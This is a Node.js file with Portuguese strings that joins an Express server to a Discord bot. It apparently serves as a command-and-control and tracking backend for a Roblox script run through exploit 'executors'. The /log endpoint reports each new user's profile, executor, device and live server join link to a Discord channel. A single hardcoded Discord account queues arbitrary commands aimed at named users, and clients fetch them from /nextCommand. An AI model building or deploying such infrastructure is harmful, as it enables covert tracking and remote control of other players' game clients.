const express = require("express");
const fs = require("fs");
const { Client, GatewayIntentBits } = require("discord.js");

const app = express();
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CANAL_DESTINO = process.env.CANAL_DESTINO;

let db = { users: [] };

function saveDB() {
    fs.writeFileSync("db.json", JSON.stringify(db, null, 2));
}

if (fs.existsSync("db.json")) {
    db = JSON.parse(fs.readFileSync("db.json"));
}

let commands = [];

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once("ready", () => {
    console.log("Bot iniciado!");
});

client.on("messageCreate", async (msg) => {
    if (msg.author.id !== "1163467888259239996") return;
    if (!msg.content.startsWith(".")) return;

    const args = msg.content.split(" ");
    const cmd = args[0].substring(1);
    const targetUser = args[1]?.toLowerCase();

    if (!targetUser) return msg.reply("Use: .comando username argumentos");

    if (cmd === "message") {
        const content = args.slice(2).join(" ");
        if (!content) return msg.reply("Use: .message <user> <content>");
        commands.push({
            user: targetUser,
            command: "message",
            content
        });
        return msg.reply(`Mensagem enviada para **${targetUser}**.`);
    }

    commands.push({
        user: targetUser,
        command: cmd,
        arg1: args[2],
        arg2: args[3]
    });

    msg.reply(`Comando **${cmd}** enviado para **${targetUser}**.`);
});

app.post("/nextCommand", (req, res) => {
    const username = req.body.username?.toLowerCase();
    if (!username) return res.json({ command: null });

    const found = commands.find(c => c.user === username);

    if (found) {
        commands = commands.filter(c => c !== found);
        return res.json(found);
    }

    return res.json({ command: null });
});

app.post("/log", async (req, res) => {
    const { userId, username, executor, device, date, time, placeId, serverJobId } = req.body;
    if (!userId || !username) return res.status(400).send("Requisição inválida.");

    if (!db.users.includes(userId)) {
        db.users.push(userId);
        saveDB();

        const channel = await client.channels.fetch(CANAL_DESTINO);

        const msg = `📌 **USUÁRIO NOVO**
**Usuário:** [${username}](https://www.roblox.com/users/${userId}/profile)
**Executor:** ${executor}
**Dispositivo:** ${device}
**Data:** ${date}
**Hora:** ${time}
**Entrar no servidor:** https://www.roblox.com/games/start?placeId=${placeId}&jobId=${serverJobId}`;

        channel.send(msg);
    }

    res.send("OK");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log("Servidor rodando na porta " + PORT);
});

client.login(BOT_TOKEN);
